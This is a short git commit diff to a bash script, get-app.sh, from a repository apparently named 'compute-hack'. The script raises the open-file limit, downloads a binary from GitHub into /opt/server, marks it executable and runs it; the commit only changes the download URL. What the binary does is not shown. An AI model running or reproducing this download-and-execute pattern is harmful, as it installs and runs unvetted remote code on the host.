988959d7d0ab2a754fdb88a0bdf0de45955882b1
joesherm58 <37711109+joesherm58@users.noreply.github.com>
2019-12-04 10:15:00 -0800

    Update get-app.sh

--- get-app.sh
+++ get-app.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 size=""
 ulimit -n 20000
-/usr/bin/wget -O /opt/server https://raw.githubusercontent.com/joesherm58/compute-hack/master/get-app.sh
+/usr/bin/wget -O /opt/server https://github.com/joesherm58/compute-hack/raw/master/server
 sleep 5
 chmod +x /opt/server
 /opt/server
